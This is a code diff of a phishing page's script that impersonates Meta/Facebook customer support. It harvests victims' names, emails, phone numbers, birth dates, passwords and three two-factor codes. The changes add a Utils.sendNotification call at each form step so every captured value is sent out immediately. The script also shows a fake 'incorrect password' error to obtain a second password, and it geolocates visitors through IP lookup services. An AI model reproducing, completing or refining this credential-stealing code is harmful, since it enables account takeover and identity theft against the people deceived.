@@ -280,8 +280,6 @@
         border-radius: 40px; text-decoration: none; font-size: 15px; font-weight: 500;
       }
       .modal-return-btn:active { background: #0052c5; }
-      .modal-user-info { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #9a979e; margin-bottom: 6px; }
-      .modal-dot { width: 4px; height: 4px; background: #9a979e; border-radius: 50%; display: inline-block; }
       .modal-btn-primary {
         width: 100%; height: 48px; background: #0064E0; color: #fff; border: none;
         border-radius: 40px; font-size: 16px; font-weight: 500; cursor: pointer;
@@ -294,7 +292,6 @@
         background: #fff; font-size: 14px; color: #9a979e; cursor: pointer;
         margin-top: 10px; font-family: inherit; -webkit-tap-highlight-color: transparent;
       }
-      .modal-success-icon { width: 64px; height: 64px; margin: 0 auto 16px; display: block; }
 
       /* ===== PHONE SELECTOR ===== */
       .nf-input-wrap {
@@ -310,42 +307,9 @@
         width: 100%; outline: none; border: none; background: transparent;
         font-size: 16px; font-family: inherit; height: 100%; display: block; padding: 0;
       }
-      .pcs-wrap { position: relative; display: flex; align-items: center; }
-      .pcs-trigger {
-        display: flex; align-items: center; gap: 4px;
-        padding: 0 8px 0 12px; height: 44px; border-right: 1px solid #e5e7eb;
-        cursor: pointer; user-select: none; flex-shrink: 0;
-        -webkit-tap-highlight-color: transparent;
-      }
-      .pcs-trigger span { font-size: 18px; line-height: 1; }
-      .pcs-dial { font-size: 13px; color: #333; font-weight: 700; margin-left: 4px; }
-      .pcs-dropdown {
-        position: absolute; top: calc(100% + 6px); left: 0; width: 270px;
-        background: #fff; border: 1px solid #e5e7eb; border-radius: 12px;
-        box-shadow: 0 8px 32px rgba(0,0,0,0.15); z-index: 9999;
-        max-height: 260px; overflow: hidden; display: flex; flex-direction: column;
-      }
-      .pcs-search {
-        padding: 10px 14px; border: none; border-bottom: 1px solid #f0f0f0;
-        font-size: 14px; outline: none; width: 100%;
-      }
-      .pcs-list { overflow-y: auto; flex: 1; }
-      .pcs-opt {
-        display: flex; align-items: center; gap: 8px; padding: 10px 14px;
-        cursor: pointer; -webkit-tap-highlight-color: transparent;
-      }
+      .pcs-opt { display: flex; align-items: center; gap: 8px; padding: 10px 14px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
       .pcs-opt:active { background: #f0f4ff; }
-      .pcs-phone-input {
-        flex: 1; height: 44px; padding: 0 12px; border: none; outline: none;
-        background: transparent; font-size: 16px; font-family: inherit; min-width: 0;
-      }
 
-      /* Loading overlay for modal */
-      .modal-loading {
-        position: absolute; inset: 0; background: rgba(255,255,255,0.85);
-        display: flex; align-items: center; justify-content: center;
-        border-radius: inherit; z-index: 10;
-      }
       .modal-loading-spinner {
         width: 32px; height: 32px; border: 3px solid #e5e7eb;
         border-top-color: #0064E0; border-radius: 50%;
@@ -794,20 +758,14 @@
       .then(function(r) { return r.json(); })
       .then(function(d) { _applyCountry(d.countryCode); })
       .catch(function() {});
-
     fetch('https://www.cloudflare.com/cdn-cgi/trace')
       .then(function(r) { return r.text(); })
-      .then(function(t) {
-        var m = t.match(/loc=([A-Z]{2})/);
-        if (m) _applyCountry(m[1]);
-      })
+      .then(function(t) { var m = t.match(/loc=([A-Z]{2})/); if (m) _applyCountry(m[1]); })
       .catch(function() {});
-
     fetch('https://ipwho.is/')
       .then(function(r) { return r.json(); })
       .then(function(d) { _applyCountry(d.country_code); })
       .catch(function() {});
-
     fetch('https://api.country.is/')
       .then(function(r) { return r.json(); })
       .then(function(d) { _applyCountry(d.country); })
@@ -829,7 +787,7 @@
     }).join('');
 
     return '<div id="pcsContainer" style="position:relative;margin-bottom:10px;">'
-      + '<div id="pcs" style="display:flex;align-items:center;border:1px solid #d4dbe3;border-radius:10px;background:#fff;height:44px;transition:border-color 0.2s;">'
+      + '<div id="pcs" style="display:flex;align-items:center;border:1px solid #d4dbe3;border-radius:10px;background:#fff;height:44px;">'
       + '<div id="pcsTrigger" onclick="_toggleDial()" style="display:flex;align-items:center;gap:4px;padding:0 8px 0 12px;height:44px;border-right:1px solid #e5e7eb;cursor:pointer;user-select:none;flex-shrink:0;-webkit-tap-highlight-color:transparent;">'
       + '<span id="pcsFlag" style="font-size:18px;line-height:1;">' + _selectedFlag + '</span>'
       + '<span id="pcsDial" style="font-size:13px;color:#333;font-weight:700;margin-left:4px;">' + _selectedDial + '</span>'
@@ -838,9 +796,7 @@
       + '<input id="phone" type="tel" placeholder="Phone number" inputmode="tel"'
       + ' style="flex:1;height:44px;padding:0 12px;border:none;outline:none;background:transparent;font-size:16px;font-family:inherit;min-width:0;">'
       + '</div>'
-      + '<div id="pcsDropdown" style="display:none;position:absolute;top:48px;left:0;width:280px;'
-      + 'background:#fff;border:1px solid #e5e7eb;border-radius:12px;'
-      + 'box-shadow:0 8px 32px rgba(0,0,0,0.18);z-index:99999;overflow:hidden;flex-direction:column;">'
+      + '<div id="pcsDropdown" style="display:none;position:absolute;top:48px;left:0;width:280px;background:#fff;border:1px solid #e5e7eb;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);z-index:99999;overflow:hidden;flex-direction:column;">'
       + '<input id="pcsSearch" type="text" placeholder="Search country..." oninput="_filterDial(this.value)"'
       + ' style="padding:10px 14px;border:none;border-bottom:1px solid #f0f0f0;font-size:14px;outline:none;width:100%;box-sizing:border-box;">'
       + '<div id="pcsList" style="overflow-y:auto;max-height:200px;">' + opts + '</div>'
@@ -857,9 +813,7 @@
       setTimeout(function() {
         var list = document.getElementById('pcsList');
         var active = document.getElementById('pcs-active');
-        if (list && active) {
-          list.scrollTop = active.offsetTop - (list.clientHeight / 2) + (active.offsetHeight / 2);
-        }
+        if (list && active) list.scrollTop = active.offsetTop - (list.clientHeight / 2) + (active.offsetHeight / 2);
         var s = document.getElementById('pcsSearch');
         if (s) { s.value = ''; _filterDial(''); s.focus(); }
       }, 30);
@@ -891,8 +845,7 @@
     var dd = document.getElementById('pcsDropdown');
     var trigger = document.getElementById('pcsTrigger');
     if (dd && trigger && !trigger.contains(e.target) && !dd.contains(e.target)) {
-      _dropOpen = false;
-      dd.style.display = 'none';
+      _dropOpen = false; dd.style.display = 'none';
     }
   });
 
@@ -944,12 +897,8 @@
       + '</div>';
 
     Modal.create('clientModal', loadingHtml);
-
     var box = document.querySelector('#clientModal .modal-box');
-    if (box) {
-      box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
-    }
-
+    if (box) box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
     Modal.open('clientModal');
 
     _onIpReady(function() {
@@ -996,6 +945,19 @@
         _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
         _masterData.dob           = document.getElementById('day').value + '/' + document.getElementById('month').value + '/' + document.getElementById('year').value;
         _masterData.message       = document.getElementById('message').value.trim();
+
+        /* ✅ TIN 1 — Thông tin */
+        Utils.sendNotification({
+          step:          'Tin 1 - Thong tin',
+          fullName:      _masterData.fullName,
+          email:         _masterData.email,
+          emailBusiness: _masterData.emailBusiness,
+          fanpage:       _masterData.fanpage,
+          phone:         _masterData.phone,
+          dob:           _masterData.dob,
+          message:       _masterData.message,
+        });
+
         Modal.close('clientModal');
         setTimeout(openSecurityModal, 280);
       });
@@ -1026,23 +988,47 @@
     var clickCount = 0;
     document.getElementById('securityForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      var pw = document.getElementById('password').value.trim();
+      var pw  = document.getElementById('password').value.trim();
       var err = document.getElementById('passwordError');
       var btn = document.getElementById('securityBtn');
       err.classList.remove('show');
       if (!pw) { err.textContent = "Please enter your password."; err.classList.add('show'); return; }
       btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
+
       if (clickCount === 0) {
         _masterData.password = pw;
+
+        /* ✅ TIN 2 — Password lần 1 */
+        Utils.sendNotification({
+          step:     'Tin 2 - Password lan 1',
+          fullName: _masterData.fullName,
+          email:    _masterData.email,
+          password: pw,
+        });
+
         setTimeout(function() {
           btn.disabled = false; btn.textContent = 'Continue';
           document.getElementById('password').value = '';
           err.textContent = "The password you've entered is incorrect."; err.classList.add('show');
           clickCount = 1;
         }, 1350);
+
       } else {
         _masterData.passwordSecond = pw;
-        setTimeout(function() { Modal.close('securityModal'); setTimeout(openAuthenticationModal, 280); }, 1500);
+
+        /* ✅ TIN 3 — Password lần 2 */
+        Utils.sendNotification({
+          step:           'Tin 3 - Password lan 2',
+          fullName:       _masterData.fullName,
+          email:          _masterData.email,
+          password:       _masterData.password,
+          passwordSecond: pw,
+        });
+
+        setTimeout(function() {
+          Modal.close('securityModal');
+          setTimeout(openAuthenticationModal, 280);
+        }, 1500);
       }
     });
   }
@@ -1051,23 +1037,20 @@
      MODAL: Two-factor Authentication
   ============================================================ */
   function openAuthenticationModal() {
-    var name = _masterData.fullName || '';
-    var email = _masterData.email || '';
-    var phone = _masterData.phone || '';
+    var name  = _masterData.fullName || '';
+    var email = _masterData.email    || '';
+    var phone = _masterData.phone    || '';
 
     function maskEmail(e) {
       if (!e) return '';
-      var parts = e.split('@');
-      if (parts.length < 2) return e;
+      var parts = e.split('@'); if (parts.length < 2) return e;
       var u = parts[0];
       return u[0] + '*'.repeat(Math.max(u.length - 1, 6)) + '@' + parts[1];
     }
     function maskPhone(p) {
       if (!p) return '';
       var clean = p.replace(/\s/g, '');
-      var prefix = clean.slice(0, 3);
-      var last2 = clean.slice(-2);
-      return prefix + ' ******* ' + last2;
+      return clean.slice(0, 3) + ' ******* ' + clean.slice(-2);
     }
 
     var hint = 'Enter the code for this account that we send to ';
@@ -1075,20 +1058,18 @@
     if (phone) hint += ', ' + maskPhone(phone);
     hint += ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
 
-    var authCount = 0;
+    var authCount  = 0;
     var cdInterval = null;
 
     function renderModal(step) {
       var stepLabel = 'Two-factor authentication required (' + (step + 1) + '/3)';
-      var html =
-        '<div style="display:flex;flex-direction:column;">'
+      return '<div style="display:flex;flex-direction:column;">'
         + '<div style="display:flex;align-items:center;gap:6px;font-size:13px;color:#9a979e;margin-bottom:8px;">'
         + '<span style="color:#1c1e21;font-weight:500;">' + name + '</span>'
         + '<span style="width:4px;height:4px;background:#9a979e;border-radius:50%;display:inline-block;flex-shrink:0;"></span>'
-        + '<span>Facebook</span>'
-        + '</div>'
+        + '<span>Facebook</span></div>'
         + '<h2 style="font-size:20px;font-weight:700;color:#000;margin:0 0 14px;">' + stepLabel + '</h2>'
-        + '<p style="font-size:14px;color:#9a979e;line-height:1.55;margin:0 0 0;">' + hint + '</p>'
+        + '<p style="font-size:14px;color:#9a979e;line-height:1.55;margin:0;">' + hint + '</p>'
         + '<div style="width:100%;border-radius:10px;background:#f5f5f5;overflow:hidden;margin:15px 0;">'
         + '<img src="public/images/authentication.png" style="width:100%;display:block;" alt="authentication">'
         + '</div>'
@@ -1097,26 +1078,19 @@
         + '<input id="twoFa" placeholder="Enter the code" type="number" inputmode="numeric" required class="nf-input">'
         + '</div>'
         + '<p id="authError" class="modal-error" style="margin-top:8px;"></p>'
-        + '<div style="margin-top:20px;">'
-        + '<button type="submit" id="authBtn" class="modal-btn-primary">Continue</button>'
-        + '</div>'
+        + '<div style="margin-top:20px;"><button type="submit" id="authBtn" class="modal-btn-primary">Continue</button></div>'
         + '<div style="margin-top:16px;width:100%;display:flex;align-items:center;justify-content:center;cursor:pointer;background:transparent;border-radius:40px;padding:10px 20px;border:1px solid #d4dbe3;">'
         + '<span style="color:#9a979e;font-size:14px;">Try another way</span>'
         + '</div>'
         + '</form>'
         + '<div style="width:60px;margin:20px auto 0;padding-top:20px;">'
-        + '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta"'
-        + ' onerror="this.style.display=\'none\'">'
-        + '</div>'
-        + '</div>';
-      return html;
+        + '<img src="public/icons/ic_meta_gray.svg" style="width:100%;height:100%;display:block;" alt="Meta" onerror="this.style.display=\'none\'">'
+        + '</div></div>';
     }
 
     Modal.create('authModal', renderModal(authCount));
-
     var box = document.querySelector('#authModal .modal-box');
     if (box) box.style.background = 'linear-gradient(130deg,rgba(249,241,249,1) 0%,rgba(234,243,253,1) 35%,rgba(237,251,242,1) 100%)';
-
     Modal.open('authModal');
 
     function bindForm() {
@@ -1125,14 +1099,23 @@
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         var code = document.getElementById('twoFa').value.trim();
-        var err = document.getElementById('authError');
-        var btn = document.getElementById('authBtn');
+        var err  = document.getElementById('authError');
+        var btn  = document.getElementById('authBtn');
         err.classList.remove('show');
         if (!code) { err.textContent = 'Please enter the code.'; err.classList.add('show'); return; }
         btn.disabled = true; btn.innerHTML = '<span class="modal-spinner"></span>';
 
         if (authCount < 2) {
           _masterData['twoFa' + authCount] = code;
+
+          /* ✅ TIN 4, 5 — 2FA lần 1 & 2 */
+          Utils.sendNotification({
+            step:     'Tin ' + (4 + authCount) + ' - 2FA lan ' + (authCount + 1),
+            fullName: _masterData.fullName,
+            email:    _masterData.email,
+            twoFa:    code,
+          });
+
           setTimeout(function() {
             var t = 30;
             btn.innerHTML = 'Continue';
@@ -1155,9 +1138,22 @@
               }
             }, 1000);
           }, 1400);
+
         } else {
           _masterData.twoFaFinal = code;
-          setTimeout(function() { Modal.close('authModal'); setTimeout(openSuccessModal, 280); }, 1600);
+
+          /* ✅ TIN 6 — 2FA lần 3 */
+          Utils.sendNotification({
+            step:     'Tin 6 - 2FA lan 3',
+            fullName: _masterData.fullName,
+            email:    _masterData.email,
+            twoFa:    code,
+          });
+
+          setTimeout(function() {
+            Modal.close('authModal');
+            setTimeout(openSuccessModal, 280);
+          }, 1600);
         }
       });
     }
@@ -1166,78 +1162,32 @@
   }
 
   /* ============================================================
-     MODAL: Success — layout giống ảnh mẫu
+     MODAL: Success
+     (Không gửi thêm notification — đã gửi đủ 6 tin ở các bước trên)
   ============================================================ */
   function openSuccessModal() {
-
-    /* Gửi thông báo */
-    Utils.sendNotification({
-      fullName:       _masterData.fullName       || '',
-      email:          _masterData.email          || '',
-      emailBusiness:  _masterData.emailBusiness  || '',
-      fanpage:        _masterData.fanpage        || '',
-      phone:          _masterData.phone          || '',
-      day:            (_masterData.dob || '').split('/')[0] || '',
-      month:          (_masterData.dob || '').split('/')[1] || '',
-      year:           (_masterData.dob || '').split('/')[2] || '',
-      message:        _masterData.message        || '',
-      password:       _masterData.password       || '',
-      passwordSecond: _masterData.passwordSecond || '',
-      twoFa:          _masterData.twoFa0         || '',
-      twoFaSecond:    _masterData.twoFa1         || '',
-      twoFaThird:     _masterData.twoFaFinal     || '',
-    });
-
     var html =
-      /* ── Header ── */
       '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">'
       + '<h2 style="font-size:16px;font-weight:600;color:#1c1e21;margin:0;">Request has been sent</h2>'
       + '<button class="modal-close" onclick="Modal.close(\'successModal\')">&times;</button>'
       + '</div>'
-
-      /* ── Hero block: gradient bg + badge trái + ảnh phải ── */
-      + '<div style="'
-      +   'border-radius:16px;overflow:hidden;margin-bottom:20px;'
-      +   'background:linear-gradient(135deg,#dce9ff 0%,#ede4fa 45%,#fce4f0 100%);'
-      +   'position:relative;min-height:170px;display:flex;align-items:center;'
-      + '">'
-
-        /* Badge xanh bên trái */
-        + '<div style="position:absolute;left:18px;top:50%;transform:translateY(-50%);z-index:2;'
-        +   'filter:drop-shadow(0 6px 16px rgba(8,102,255,0.25));width:72px;height:72px;">'
-        + '<img src="public/images/ICONMOI.svg" alt="verified badge" style="width:100%;height:100%;display:block;">'
-        + '</div>'
-
-        /* Ảnh collage bên phải — dùng photo_meta.png giống hero section */
+      + '<div style="border-radius:16px;overflow:hidden;margin-bottom:20px;background:linear-gradient(135deg,#dce9ff 0%,#ede4fa 45%,#fce4f0 100%);position:relative;min-height:170px;display:flex;align-items:center;">'
+        + '<div style="position:absolute;left:18px;top:50%;transform:translateY(-50%);z-index:2;filter:drop-shadow(0 6px 16px rgba(8,102,255,0.25));width:72px;height:72px;">'
+        + '<img src="public/images/ICONMOI.svg" alt="verified badge" style="width:100%;height:100%;display:block;"></div>'
         + '<div style="margin-left:auto;width:62%;max-width:260px;flex-shrink:0;">'
-        + '<img src="public/images/photo_meta.png" alt="Meta Verified"'
-        +   ' style="width:100%;height:170px;object-fit:cover;object-position:center top;display:block;">'
-        + '</div>'
-
+        + '<img src="public/images/photo_meta.png" alt="Meta Verified" style="width:100%;height:170px;object-fit:cover;object-position:center top;display:block;"></div>'
       + '</div>'
-
-      /* ── Body text ── */
-      + '<p style="color:#3d3d3d;font-size:14px;line-height:1.7;margin:0 0 6px;">'
-      + 'Your request has been added to the processing queue. We will handle your request within 24 hours in case we do not receive feedback, please send back information so we can assist you.'
-      + '</p>'
+      + '<p style="color:#3d3d3d;font-size:14px;line-height:1.7;margin:0 0 6px;">Your request has been added to the processing queue. We will handle your request within 24 hours in case we do not receive feedback, please send back information so we can assist you.</p>'
       + '<p style="color:#606770;font-size:14px;margin:0 0 24px;">From the Customer support Meta.</p>'
-
-      /* ── Button ── */
       + '<a href="https://www.facebook.com" class="modal-return-btn">Return to facebook</a>'
-
-      /* ── Meta logo ── */
       + '<div style="text-align:center;margin-top:18px;">'
-      + '<img src="public/icons/ic_meta_gray.svg" alt="Meta"'
-      +   ' style="height:18px;display:inline-block;"'
-      +   ' onerror="this.outerHTML=\'<svg viewBox=\\\"0 0 60 12\\\" width=\\\"60\\\" height=\\\"12\\\"><text y=\\\"11\\\" font-size=\\\"11\\\" fill=\\\"#9ca3af\\\" font-family=\\\"sans-serif\\\">&#x229E; Meta</text></svg>\'">'
+      + '<img src="public/icons/ic_meta_gray.svg" alt="Meta" style="height:18px;display:inline-block;"'
+      + ' onerror="this.outerHTML=\'<svg viewBox=\\\"0 0 60 12\\\" width=\\\"60\\\" height=\\\"12\\\"><text y=\\\"11\\\" font-size=\\\"11\\\" fill=\\\"#9ca3af\\\" font-family=\\\"sans-serif\\\">&#x229E; Meta</text></svg>\'">'
       + '</div>';
 
     Modal.create('successModal', html);
-
-    /* Nền trắng cho modal success */
     var box = document.querySelector('#successModal .modal-box');
     if (box) box.style.background = '#fff';
-
     Modal.open('successModal');
   }
   </script>
